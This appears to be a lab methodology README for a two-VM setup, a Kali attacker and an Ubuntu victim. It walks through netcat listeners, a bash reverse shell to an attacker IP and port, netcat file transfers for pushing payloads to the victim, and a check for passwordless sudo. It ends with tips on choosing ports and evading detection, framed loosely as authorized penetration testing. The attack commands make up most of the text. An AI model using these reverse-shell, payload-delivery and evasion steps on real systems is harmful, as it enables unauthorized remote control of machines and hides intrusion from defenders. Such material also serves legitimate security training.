# Description of the work methodology

## Kali (VM - Attacker):

1. This command establishes a "listener" that listens for requests from other devices to our IP on port 444. If the connection is established (the victim machine has to execute a command that makes the request), thanks to NetCat, a bridge connection will be made between the Attacking VM and Victim VM, allowing you to control the victim machine at will. WARNING: It only accepts some plain text commands, such as: whoami, id, pwd, ls, cat, find, uname, ps, netstat, ifconfig, etc. Be careful with SUDO commands - they are not recommended unless the victim user has the permissions and is configured to use SUDO without a password. You can verify this with ```sudo -l```. If it doesn't ask for a password, you can use sudo freely and it should appear in the file:
   ```
   /etc/sudoers
   username ALL=(ALL) NOPASSWD: ALL
   ```

   > For a simple connection: ```sudo nc -nlvp {PORT}```

2. This command establishes a "listener" that listens for a request from other devices to our IP on port 445. If the connection is established (the victim machine has to execute a command that makes the request with a desired file and directory), the attacker machine will be able to send any file they want ({FILE}) to the victim.

   > For a connection with data transfer: ```nc -lvnp {PORT} < {DIRECTORY}/{FILE}```

## Ubuntu (VM - Victim)

1. This command creates the reverse shell. Step-by-step explanation:
   - "bash -i" starts an interactive shell, which allows the user to manipulate the operating system through a terminal that listens indefinitely (until user interruption) for inputs.
   - ">& /dev/tcp/{IP}/{PORT}" Makes the interactive shell not necessarily from the host terminal, but redirects standard output (stdout) and errors (stderr) to a TCP connection to the specific IP and Port ({IP}/{PORT}). This is essential to be controlled from another VM through the network.
   - "0>&1" Makes the interactive shell redirect data input (stdin) from the same connection, allowing the attacking machine to send commands or requests to the victim machine.

   > To accept the simple connection: ```bash -i >& /dev/tcp/{IP}/{PORT} 0>&1```

2. This command connects to the attacker machine to receive a file transfer. The victim machine connects to the specified IP and port, and redirects the incoming data stream to create or overwrite a file in the specified directory. This is useful for receiving files, scripts, or payloads from the attacker machine.

   > To accept and receive data transfer: ```nc {IP} {PORT} > {DIRECTORY}/{FILE}```

## Additional Security Notes:
 
- **Port Selection**: Use non-standard ports to avoid detection. Common ports like 80, 443, 53 might be less suspicious.
- **Firewall Considerations**: Ensure the target ports are not blocked by firewall rules.
- **Detection Evasion**: These connections may be detected by network monitoring tools. Use sparingly in authorized penetration testing only.
- **Alternative Shells**: Consider using other shells like ```/bin/sh``` or ```zsh``` if bash is not available.
- **Persistence**: These connections are not persistent and will be lost if the network connection drops.